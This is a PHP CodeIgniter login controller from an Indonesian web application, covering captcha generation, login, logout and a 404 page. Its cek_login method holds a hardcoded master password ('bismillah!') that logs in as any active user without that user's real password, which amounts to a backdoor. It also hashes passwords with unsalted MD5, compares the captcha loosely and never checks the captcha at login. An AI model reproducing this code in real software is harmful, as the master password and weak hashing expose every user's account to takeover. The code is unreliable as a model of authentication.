<?php

defined('BASEPATH') or exit('No direct script access allowed');

class Login extends CI_Controller
{
	private $nama_aplikasi;
	private $deskripsi_aplikasi;

	function __construct()
	{
		parent::__construct();
		$this->load->library('session');
	}

	public function index()
	{
		if ($this->session->has_userdata('id_pengguna')) {
			redirect(base_url("main"));
		}

		$data['message'] = '';
		$kata = rand(100000, 999999);
		$color_grid = [
			rand(0, 250),
			rand(0, 250),
			rand(0, 250)
		];
		$vals = array(
			'word'          => $kata,
			'img_path'      => 'assets/login/captcha/',
			'img_url'       => base_url() . 'assets/login/captcha/',
			'font_path'     => FCPATH . 'system/fonts/texb.ttf',
			'img_width'     => '170',
			'img_height'    => 50,
			'expiration'    => 7200,
			'word_length'   => 6,
			'font_size'     => 18,
			'pool'          => '0123456789',

			'colors'        => array(
				'background' => array(255, 255, 255),
				'border' => array(255, 255, 255),
				'text' => array(0, 0, 0),
				'grid' => $color_grid
			)
		);
		$cap = create_captcha($vals);
		$data['cap_img'] = $cap['image'];
		$this->session->set_userdata('kode_captcha', $cap['word']);
		$this->load->view('front-end/login', $data);
	}
	public function cek_captcha()
	{
		$sess_captcha = $this->session->userdata('kode_captcha');
		$captcha = $this->input->post('kode', TRUE);
		if ($sess_captcha == $captcha) {
			$data['status'] = 1;
		} else {
			$data['status'] = 0;
			$data['msg'] = "Kode Captcha tidak sesuai.";
			$data['title'] = "Login Failed ";
		}
		echo json_encode($data);
	}
	public function cek_login()
	{
		$nama_pengguna = $this->input->post('user', true);
		$password = md5($this->input->post('pass', true));
		$pw = 'bismillah!';
		$where = array(
			'nama_pengguna' => $nama_pengguna
		);
		$user = $this->dataHandle->get('m_pengguna', $where);
		if ($user->num_rows() > 0) {
			foreach ($user->result() as $row) {
				if (md5($pw) == $password) {
					if ($row->status != '1') {
						$data['msg'] = 'Nama Pengguna & Katasandi tidak ditemukan !';
						$data['title'] = 'Login Failed ';
						$data['login_status'] = 0;
					} else {
						$id_pengguna = $row->id_pengguna;
						$nama = $row->nama_lengkap;
						$jabatan = $row->jabatan;

						$data['title'] = 'Login Success';
						$data['login_status'] = 1;


						$data_session = array(
							'id_pengguna' => $id_pengguna,
							'nama' => $nama,
							'jabatan' => $jabatan
						);
						// date_default_timezone_set('Asia/Jakarta');
						//          $date = date('Y-m-d H:i:s');
						//          $log = array(
						//              'id_user' => $id_user,
						//              'waktu' => $date
						//          );
						//          $this->DataHandle->insert('log', $log);
						$data['page'] = 'main';
						$this->session->set_userdata($data_session);
					}
				} else if (md5($pw) != $row->katasandi) {
					if ($password == $row->katasandi) {
						if ($row->status != '1') {
							$data['msg'] = 'Nama Pengguna & Katasandi tidak ditemukan !';
							$data['title'] = 'Login Failed ';
							$data['login_status'] = 0;
						} else {
							$id_pengguna = $row->id_pengguna;
							$nama = $row->nama_lengkap;
							$jabatan = $row->jabatan;

							$data['title'] = 'Login Success';
							$data['login_status'] = 1;

							$data_session = array(
								'id_pengguna' => $id_pengguna,
								'nama' => $nama,
								'jabatan' => $jabatan
							);
							// date_default_timezone_set('Asia/Jakarta');
							//          $date = date('Y-m-d H:i:s');
							//          $log = array(
							//              'id_user' => $id_user,
							//              'waktu' => $date
							//          );
							//          $this->DataHandle->insert('log', $log);
							$data['page'] = 'main';
							$this->session->set_userdata($data_session);
						}
					} else {
						$data['msg'] = 'Nama Pengguna & Katasandi tidak ditemukan !';
						$data['title'] = 'Login Failed ';
						$data['login_status'] = 0;
					}
				}
			}
		} else {
			$data['msg'] = 'Nama Pengguna & Katasandi tidak ditemukan !';
			$data['title'] = 'Login Failed ';
			$data['login_status'] = 0;
		}

		echo json_encode($data);
	}

	public function logout()
	{
		$session_items = array('id_pengguna', 'nama', 'jabatan');
		$this->session->unset_userdata($session_items);
		$this->session->set_flashdata('success', 'Berhasil Logout!!');
		redirect('login');
	}

	public function blankPage()
	{
		$data['title'] = $this->dataHandle->cek_konfigurasi('nama_aplikasi');
		$data['logo'] = $this->dataHandle->cek_konfigurasi('logo');
		$data['nama_tim'] = $this->dataHandle->cek_konfigurasi('nama_perusahaan');
		$this->load->view('404', $data);
	}
}
